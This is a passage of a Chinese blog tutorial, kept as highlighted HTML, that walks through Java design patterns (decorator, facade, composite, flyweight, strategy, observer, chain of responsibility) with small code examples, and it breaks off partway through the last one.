class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bevarage.getDescription() + <span class="string">", 加芒果"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> beverage.cost() + <span class="number">3</span>; <span class="comment">// 加芒果需要 3 元</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...<span class="comment">// 给每一种调料都加一个类</span></span><br></pre></td></tr></table></figure><p>看客户端调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 首先，我们需要一个基础饮料，红茶、绿茶或咖啡</span></span><br><span class="line">    Beverage beverage = <span class="keyword">new</span> GreenTea();</span><br><span class="line">    <span class="comment">// 开始装饰</span></span><br><span class="line">    beverage = <span class="keyword">new</span> Lemon(beverage); <span class="comment">// 先加一份柠檬</span></span><br><span class="line">    beverage = <span class="keyword">new</span> Mongo(beverage); <span class="comment">// 再加一份芒果</span></span><br><span class="line"></span><br><span class="line">    System.out.println(beverage.getDescription() + <span class="string">" 价格：￥"</span> + beverage.cost());</span><br><span class="line">    <span class="comment">//"绿茶, 加柠檬, 加芒果 价格：￥16"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们需要 <strong>芒果-珍珠-双份柠檬-红茶</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Beverage beverage = <span class="keyword">new</span> Mongo(<span class="keyword">new</span> Pearl(<span class="keyword">new</span> Lemon(<span class="keyword">new</span> Lemon(<span class="keyword">new</span> BlackTea()))));</span><br></pre></td></tr></table></figure><p>是不是很变态？</p><p>看看下图可能会清晰一些：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/decorator-2.png" alt="decorator-2"></p><p>到这里，大家应该已经清楚装饰模式了吧。</p><p>下面，我们再来说说 java IO 中的装饰模式。看下图 InputStream 派生出来的部分类：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/decorator-3.png" alt="decorator-3"></p><p>我们知道 InputStream 代表了输入流，具体的输入来源可以是文件（FileInputStream）、管道（PipedInputStream）、数组（ByteArrayInputStream）等，这些就像前面奶茶的例子中的红茶、绿茶，属于基础输入流。</p><p>FilterInputStream 承接了装饰模式的关键节点，它的实现类是一系列装饰器，比如 BufferedInputStream 代表用缓冲来装饰，也就使得输入流具有了缓冲的功能，LineNumberInputStream 代表用行号来装饰，在操作的时候就可以取得行号了，DataInputStream 的装饰，使得我们可以从输入流转换为 java 中的基本类型值。</p><p>当然，在 java IO 中，如果我们使用装饰器的话，就不太适合面向接口编程了，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream inputStream = <span class="keyword">new</span> LineNumberInputStream(<span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">""</span>)));</span><br></pre></td></tr></table></figure><p>这样的结果是，InputStream 还是不具有读取行号的功能，因为读取行号的方法定义在 LineNumberInputStream 类中。</p><p>我们应该像下面这样使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DataInputStream is = <span class="keyword">new</span> DataInputStream(</span><br><span class="line">  <span class="keyword">new</span> BufferedInputStream(</span><br><span class="line">                              <span class="keyword">new</span> FileInputStream(<span class="string">""</span>)));</span><br></pre></td></tr></table></figure><blockquote><p>所以说嘛，要找到纯的严格符合设计模式的代码还是比较难的。</p></blockquote><h3><span id="门面模式">门面模式</span></h3><p>门面模式（也叫外观模式，Facade Pattern）在许多源码中有使用，比如 slf4j 就可以理解为是门面模式的应用。这是一个简单的设计模式，我们直接上代码再说吧。</p><p>首先，我们定义一个接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义几个实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Circle</span> <span class="keyword">implements</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       System.out.println(<span class="string">"Circle::draw()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> <span class="keyword">implements</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       System.out.println(<span class="string">"Rectangle::draw()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 画一个圆形</span></span><br><span class="line">  Shape circle = <span class="keyword">new</span> Circle();</span><br><span class="line">  circle.draw();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 画一个长方形</span></span><br><span class="line">  Shape rectangle = <span class="keyword">new</span> Rectangle();</span><br><span class="line">  rectangle.draw();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是我们常写的代码，我们需要画圆就要先实例化圆，画长方形就需要先实例化一个长方形，然后再调用相应的 draw() 方法。</p><p>下面，我们看看怎么用门面模式来让客户端调用更加友好一些。</p><p>我们先定义一个门面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShapeMaker</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> Shape circle;</span><br><span class="line">   <span class="keyword">private</span> Shape rectangle;</span><br><span class="line">   <span class="keyword">private</span> Shape square;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">ShapeMaker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      circle = <span class="keyword">new</span> Circle();</span><br><span class="line">      rectangle = <span class="keyword">new</span> Rectangle();</span><br><span class="line">      square = <span class="keyword">new</span> Square();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 下面定义一堆方法，具体应该调用什么方法，由这个门面来决定</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drawCircle</span><span class="params">()</span></span>&#123;</span><br><span class="line">      circle.draw();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drawRectangle</span><span class="params">()</span></span>&#123;</span><br><span class="line">      rectangle.draw();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drawSquare</span><span class="params">()</span></span>&#123;</span><br><span class="line">      square.draw();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看现在客户端怎么调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ShapeMaker shapeMaker = <span class="keyword">new</span> ShapeMaker();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 客户端调用现在更加清晰了</span></span><br><span class="line">  shapeMaker.drawCircle();</span><br><span class="line">  shapeMaker.drawRectangle();</span><br><span class="line">  shapeMaker.drawSquare();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>门面模式的优点显而易见，客户端不再需要关注实例化时应该使用哪个实现类，直接调用门面提供的方法就可以了，因为门面类提供的方法的方法名对于客户端来说已经很友好了。</p><h3><span id="组合模式">组合模式</span></h3><p>组合模式用于表示具有层次结构的数据，使得我们对单个对象和组合对象的访问具有一致性。</p><p>直接看一个例子吧，每个员工都有姓名、部门、薪水这些属性，同时还有下属员工集合（虽然可能集合为空），而下属员工和自己的结构是一样的，也有姓名、部门这些属性，同时也有他们的下属员工集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> String dept;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> salary;</span><br><span class="line">   <span class="keyword">private</span> List&lt;Employee&gt; subordinates; <span class="comment">// 下属</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String name,String dept, <span class="keyword">int</span> sal)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">      <span class="keyword">this</span>.dept = dept;</span><br><span class="line">      <span class="keyword">this</span>.salary = sal;</span><br><span class="line">      subordinates = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Employee e)</span> </span>&#123;</span><br><span class="line">      subordinates.add(e);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(Employee e)</span> </span>&#123;</span><br><span class="line">      subordinates.remove(e);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> List&lt;Employee&gt; <span class="title">getSubordinates</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">return</span> subordinates;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> (<span class="string">"Employee :[ Name : "</span> + name + <span class="string">", dept : "</span> + dept + <span class="string">", salary :"</span> + salary+<span class="string">" ]"</span>);</span><br><span class="line">   &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常，这种类需要定义 add(node)、remove(node)、getChildren() 这些方法。</p><p>这说的其实就是组合模式，这种简单的模式我就不做过多介绍了，相信各位读者也不喜欢看我写废话。</p><h3><span id="享元模式">享元模式</span></h3><p>英文是 Flyweight Pattern，不知道是谁最先翻译的这个词，感觉这翻译真的不好理解，我们试着强行关联起来吧。Flyweight 是轻量级的意思，享元分开来说就是 共享 元器件，也就是复用已经生成的对象，这种做法当然也就是轻量级的了。</p><p>复用对象最简单的方式是，用一个 HashMap 来存放每次新生成的对象。每次需要一个对象的时候，先到 HashMap 中看看有没有，如果没有，再生成新的对象，然后将这个对象放入 HashMap 中。</p><p>这种简单的代码我就不演示了。</p><h3><span id="结构型模式总结">结构型模式总结</span></h3><p>前面，我们说了代理模式、适配器模式、桥梁模式、装饰模式、门面模式、组合模式和享元模式。读者是否可以分别把这几个模式说清楚了呢？在说到这些模式的时候，心中是否有一个清晰的图或处理流程在脑海里呢？</p><p>代理模式是做方法增强的，适配器模式是把鸡包装成鸭这种用来适配接口的，桥梁模式做到了很好的解耦，装饰模式从名字上就看得出来，适合于装饰类或者说是增强类的场景，门面模式的优点是客户端不需要关心实例化过程，只要调用需要的方法即可，组合模式用于描述具有层次结构的数据，享元模式是为了在特定的场景中缓存已经创建的对象，用于提高性能。</p><h2><span id="行为型模式">行为型模式</span></h2><p>行为型模式关注的是各个类之间的相互作用，将职责划分清楚，使得我们的代码更加地清晰。</p><h3><span id="策略模式">策略模式</span></h3><p>策略模式太常用了，所以把它放到最前面进行介绍。它比较简单，我就不废话，直接用代码说事吧。</p><p>下面设计的场景是，我们需要画一个图形，可选的策略就是用红色笔来画，还是绿色笔来画，或者蓝色笔来画。</p><p>首先，先定义一个策略接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们定义具体的几个策略：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedPen</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"用红色笔画图，radius:"</span> + radius + <span class="string">", x:"</span> + x + <span class="string">", y:"</span> + y);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreenPen</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"用绿色笔画图，radius:"</span> + radius + <span class="string">", x:"</span> + x + <span class="string">", y:"</span> + y);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BluePen</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"用蓝色笔画图，radius:"</span> + radius + <span class="string">", x:"</span> + x + <span class="string">", y:"</span> + y);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用策略的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Context</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> Strategy strategy;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Context</span><span class="params">(Strategy strategy)</span></span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.strategy = strategy;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">executeDraw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> strategy.draw(radius, x, y);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Context context = <span class="keyword">new</span> Context(<span class="keyword">new</span> BluePen()); <span class="comment">// 使用绿色笔来画</span></span><br><span class="line">  context.executeDraw(<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放到一张图上，让大家看得清晰些：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/strategy-1.png" alt="strategy-1"></p><p>这个时候，大家有没有联想到结构型模式中的桥梁模式，它们其实非常相似，我把桥梁模式的图拿过来大家对比下：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/bridge-1.png" alt="bridge-1"></p><p>要我说的话，它们非常相似，桥梁模式在左侧加了一层抽象而已。桥梁模式的耦合更低，结构更复杂一些。</p><h3><span id="观察者模式">观察者模式</span></h3><p>观察者模式对于我们来说，真是再简单不过了。无外乎两个操作，观察者订阅自己关心的主题和主题有数据变化后通知观察者们。</p><p>首先，需要定义主题，每个主题需要持有观察者列表的引用，用于在数据变更的时候通知各个观察者：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Observer&gt; observers = <span class="keyword">new</span> ArrayList&lt;Observer&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> state;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(<span class="keyword">int</span> state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">        <span class="comment">// 数据已变更，通知观察者们</span></span><br><span class="line">        notifyAllObservers();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注册观察者</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attach</span><span class="params">(Observer observer)</span> </span>&#123;</span><br><span class="line">        observers.add(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通知观察者们</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">notifyAllObservers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Observer observer : observers) &#123;</span><br><span class="line">            observer.update();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义观察者接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Subject subject;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实如果只有一个观察者类的话，接口都不用定义了，不过，通常场景下，既然用到了观察者模式，我们就是希望一个事件出来了，会有多个不同的类需要处理相应的信息。比如，订单修改成功事件，我们希望发短信的类得到通知、发邮件的类得到通知、处理物流信息的类得到通知等。</p><p>我们来定义具体的几个观察者类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryObserver</span> <span class="keyword">extends</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在构造方法中进行订阅主题</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BinaryObserver</span><span class="params">(Subject subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">        <span class="comment">// 通常在构造方法中将 this 发布出去的操作一定要小心</span></span><br><span class="line">        <span class="keyword">this</span>.subject.attach(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 该方法由主题类在数据变更的时候进行调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String result = Integer.toBinaryString(subject.getState());</span><br><span class="line">        System.out.println(<span class="string">"订阅的数据发生变化，新的数据处理为二进制值为："</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HexaObserver</span> <span class="keyword">extends</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HexaObserver</span><span class="params">(Subject subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">        <span class="keyword">this</span>.subject.attach(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String result = Integer.toHexString(subject.getState()).toUpperCase();</span><br><span class="line">        System.out.println(<span class="string">"订阅的数据发生变化，新的数据处理为十六进制值为："</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端使用也非常简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 先定义一个主题</span></span><br><span class="line">    Subject subject1 = <span class="keyword">new</span> Subject();</span><br><span class="line">    <span class="comment">// 定义观察者</span></span><br><span class="line">    <span class="keyword">new</span> BinaryObserver(subject1);</span><br><span class="line">    <span class="keyword">new</span> HexaObserver(subject1);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 模拟数据变更，这个时候，观察者们的 update 方法将会被调用</span></span><br><span class="line">    subject.setState(<span class="number">11</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">订阅的数据发生变化，新的数据处理为二进制值为：1011</span><br><span class="line">订阅的数据发生变化，新的数据处理为十六进制值为：B</span><br></pre></td></tr></table></figure><p>当然，jdk 也提供了相似的支持，具体的大家可以参考 java.util.Observable 和 java.util.Observer 这两个类。</p><p>实际生产过程中，观察者模式往往用消息中间件来实现，如果要实现单机观察者模式，笔者建议读者使用 Guava 中的 EventBus，它有同步实现也有异步实现，本文主要介绍设计模式，就不展开说了。</p><p>还有，即使是上面的这个代码，也会有很多变种，大家只要记住核心的部分，那就是一定有一个地方存放了所有的观察者，然后在事件发生的时候，遍历观察者，调用它们的回调函数。</p><h3><span id="责任链模式">责任链模式</span></h3><p>责任链通常需要先建立一个单向链表，然后调用方只需要调用头部节点就可以了，后面会自动流转下去。比如流程审批就是一个很好的例子，只要终端用户提交申请，根据申请的内容信息，自动建立一条责任链，然后就可以开始流转了。</p><p>有这么一个场景，用户参加一个活动可以领取奖品，但是活动需要进行很多的规则校验然后才能放行，比如首先需要校验用户是否是新用户、今日参与人数是否有限额、全场参与人数是否有限额等等。设定的规则都通过后，才能让用户领走奖品。</p><blockquote><p>如果产品给你这个需求的话，我想大部分人一开始肯定想的就是，用一个 List 来存放所有的规则，然后 foreach 执行一下每个规则就好了。不过，读者也先别急，看看责任链模式和我们说的这个有什么不一样？</p></blockquote><p>首先，我们要定义流程上节点的基类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">RuleHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 后继节点</span></span><br><span class="line">    